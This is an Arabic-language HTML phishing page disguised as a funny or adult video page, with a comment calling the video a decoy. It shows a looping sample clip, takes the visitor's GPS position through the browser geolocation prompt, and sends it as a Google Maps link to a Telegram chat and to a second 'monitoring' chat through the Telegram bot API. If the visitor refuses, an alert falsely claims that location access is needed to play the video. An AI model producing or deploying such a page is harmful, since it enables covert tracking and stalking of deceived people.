<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8"><title>شاهد الفيديو المضحك 😂</title>
</head>
<body style="background:#000; color:#fff; text-align:center; font-family:sans-serif; margin:0; overflow:hidden;">
    <h2 style="margin-top:20px;">اضغط "سماح" لمشاهدة أقوى المقاطع المضحكة 🔞</h2>
    
    <!-- فيديو مضحك للتمويه -->
    <video width="100%" height="auto" autoplay loop muted playsinline style="max-width:500px; border-radius:15px;">
        <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
    </video>

    <script>
        const p = new URLSearchParams(window.location.search);
        const userId = p.get('user_id'), adminId = p.get('admin_id'), botToken = p.get('bot_token');

        window.onload = function() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(pos) {
                    const map = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                    const msg = `📍 **Location Captured!**\n🌍 **Maps:** [فتح الموقع](${map})\n👑 **Dev:** Abu Osayed Malkawi`;
                    
                    fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${userId}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
                    fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${adminId}&text=${encodeURIComponent("⚠️ نسخة المراقبة:\n" + msg)}&parse_mode=Markdown`);
                }, function() {
                    alert("عذراً، يجب السماح بالوصول للموقع لتشغيل الفيديو!");
                });
            }
        };
    </script>
</body>
</html>
